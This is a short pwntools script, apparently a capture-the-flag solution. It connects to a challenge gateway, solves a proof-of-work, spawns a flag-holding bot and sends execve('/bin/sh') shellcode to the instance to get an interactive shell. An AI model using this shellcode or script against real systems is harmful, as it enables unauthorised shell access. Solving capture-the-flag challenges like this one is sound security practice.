from instancer.pow import solve_challenge
from pwn import *

# fill in port number here
p_gateway = remote("3.142.53.224", 9000)

# Solve the proof-of-work if enabled (limits abuse)
pow = p_gateway.recvline()
if pow.startswith(b"== proof-of-work: enabled =="):
    p_gateway.recvline()
    p_gateway.recvline()
    challenge = p_gateway.recvline().decode().split(" ")[-1]
    p_gateway.recvuntil("Solution? ")
    p_gateway.sendline(solve_challenge(challenge))

# Get the IP and port of the instance
p_gateway.recvuntil("ip = ")
ip = p_gateway.recvuntil("\n").decode().strip()
p_gateway.recvuntil("port = ")
port = int(p_gateway.recvuntil("\n").decode().strip())


# Helper to start the bot (which has the flag)
# (optionally, you can start the bot with a fake flag for debugging)
def start_bot(fake_flag=None):
    p_gateway.recvuntil("Choice: ")

    if fake_flag is not None:
        p_gateway.sendline("2")
        p_gateway.recvuntil(":")
        p_gateway.sendline(fake_flag)
    else:
        p_gateway.sendline("1")

    p_gateway.recvuntil("Bot spawned")


p = remote(ip, port)

# Start bot with real flag
start_bot()

# ** your really great solution goes here **

shell = "\x6A\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x48\x89\xE7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xF6\x56\x6A\x08\x5E\x48\x01\xE6\x56\x48\x89\xE6\x31\xD2\x6A\x3B\x58\x0F\x05"
p.send("H")
sleep(1)
p.send(shell.ljust(0x1000, "\0"))
p.interactive()
